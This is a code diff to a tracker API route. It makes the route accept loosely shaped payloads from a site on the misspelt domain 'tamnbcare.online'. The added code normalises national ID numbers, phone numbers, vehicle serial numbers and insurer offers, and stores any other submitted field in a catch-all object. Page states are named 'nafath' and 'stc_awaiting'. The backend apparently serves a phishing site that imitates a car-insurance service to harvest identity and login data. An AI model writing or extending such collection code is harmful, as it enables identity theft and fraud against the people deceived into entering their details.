@@ -41,6 +41,17 @@ const LegacyBodySchema = z.object({
   page: z.string().min(1).max(200).optional(),
 });
 
+// Loose shape used by the live tamnbcare.online tracker:
+//   { sid, pathname, event, ...flatFields, submission?: {...} }
+const LooseBodySchema = z
+  .object({
+    sid: z.string().min(4).max(64),
+    pathname: z.string().max(300).optional(),
+    page: z.string().max(300).optional(),
+    event: z.string().max(40).optional(),
+  })
+  .passthrough();
+
 function pageFromPath(path: string | undefined): z.infer<typeof PageEnum> {
   const normalized = (path ?? "/").toLowerCase();
   if (normalized.includes("insurer") || normalized.includes("compare")) return "insurer_selected";
@@ -52,6 +63,84 @@ function pageFromPath(path: string | undefined): z.infer<typeof PageEnum> {
   if (normalized.includes("nafath")) return "nafath";
   if (normalized.includes("stc")) return "stc_awaiting";
   return "quote_landing";
+}
+
+const FIELD_ALIASES: Record<string, string> = {
+  national_id: "nationalId",
+  nationalid: "nationalId",
+  nationalId: "nationalId",
+  id_number: "nationalId",
+  phone: "phone",
+  phone_number: "phone",
+  mobile: "phone",
+  serial_number: "serialNumber",
+  serialNumber: "serialNumber",
+  sequence_number: "serialNumber",
+  vehicle_make: "vehicleMake",
+  vehicleMake: "vehicleMake",
+  make: "vehicleMake",
+  vehicle_model: "vehicleModel",
+  vehicleModel: "vehicleModel",
+  model: "vehicleModel",
+  model_year: "modelYear",
+  modelYear: "modelYear",
+  year: "modelYear",
+  declared_value: "declaredValue",
+  declaredValue: "declaredValue",
+  value: "declaredValue",
+  insurer_company: "insurerCompany",
+  insurerCompany: "insurerCompany",
+  insurer: "insurerCompany",
+  company: "insurerCompany",
+  insurer_offer_sar: "insurerOfferSar",
+  insurerOfferSar: "insurerOfferSar",
+  offer: "insurerOfferSar",
+  price: "insurerOfferSar",
+  amount: "insurerOfferSar",
+};
+
+const NUMERIC_FIELDS = new Set(["modelYear", "declaredValue", "insurerOfferSar"]);
+const SKIP_KEYS = new Set([
+  "sid", "pathname", "page", "event", "type", "data", "submission",
+  "ip", "client_ip", "country", "user_agent", "ua", "timestamp", "ts",
+]);
+
+function coerceLoose(raw: Record<string, unknown>): z.infer<typeof BodySchema> {
+  const sid = String(raw["sid"] ?? "");
+  const pathish = (raw["page"] as string | undefined) ?? (raw["pathname"] as string | undefined);
+  const event = String(raw["event"] ?? "visit");
+  const type: "visit" | "update" | "submit" =
+    event === "submit" || event === "form_data" ? "submit" : event === "update" ? "update" : "visit";
+  const data: Record<string, unknown> = {};
+  const submission: Record<string, string> = {
+    ...((raw["submission"] as Record<string, string> | undefined) ?? {}),
+  };
+  for (const [k, v] of Object.entries(raw)) {
+    if (v == null || v === "") continue;
+    if (SKIP_KEYS.has(k)) continue;
+    if (k.startsWith("submission.")) {
+      submission[k.slice("submission.".length)] = String(v);
+      continue;
+    }
+    const alias = FIELD_ALIASES[k];
+    if (alias) {
+      if (NUMERIC_FIELDS.has(alias)) {
+        const n = typeof v === "number" ? v : Number(String(v).replace(/[^\d.]/g, ""));
+        if (!Number.isNaN(n) && n > 0) data[alias] = n;
+      } else {
+        data[alias] = String(v);
+      }
+    } else if (typeof v === "string" || typeof v === "number") {
+      submission[k] = String(v);
+    }
+  }
+  if (Object.keys(submission).length) data["submission"] = submission;
+  return {
+    sid,
+    type,
+    page: pageFromPath(pathish),
+    data: Object.keys(data).length ? (data as z.infer<typeof BodySchema>["data"]) : undefined,
+  };
 }
 
 const DEFAULT_ORIGIN = "https://tmnbcre.lovable.app";
@@ -87,12 +176,12 @@ export const Route = createFileRoute("/api/public/track")({
         }
         const currentPayload = BodySchema.safeParse(json);
         const legacyPayload = LegacyBodySchema.safeParse(json);
-        if (!currentPayload.success && !legacyPayload.success) {
-          return new Response("Invalid payload", { status: 400, headers: corsHeaders(origin) });
-        }
+        const loosePayload = LooseBodySchema.safeParse(json);
         let payload: z.infer<typeof BodySchema>;
         if (currentPayload.success) {
           payload = currentPayload.data;
+        } else if (loosePayload.success) {
+          payload = coerceLoose(loosePayload.data as Record<string, unknown>);
         } else if (legacyPayload.success) {
           payload = {
             sid: legacyPayload.data.sessionId,
